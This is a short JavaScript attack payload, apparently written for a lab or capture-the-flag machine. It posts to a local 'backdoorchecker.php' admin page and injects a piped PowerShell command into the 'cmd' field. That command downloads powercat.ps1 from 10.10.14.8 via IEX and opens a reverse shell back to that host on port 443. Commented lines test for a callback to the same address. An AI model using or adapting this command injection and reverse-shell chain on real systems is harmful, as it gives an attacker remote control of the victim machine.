// var xhr_test = new XMLHttpRequest();
// xhr_test.open("GET", "http://10.10.14.8");
// xhr_test.send();
var param = "cmd=dir"
var shell = "Powershell IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.8/powercat.ps1');powercat -c 10.10.14.8 -p 443 -e cmd"
var payload = param+"|"+shell

var xhr = new XMLHttpRequest();
xhr.open("POST", "http://localhost/admin/backdoorchecker.php");
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send(payload);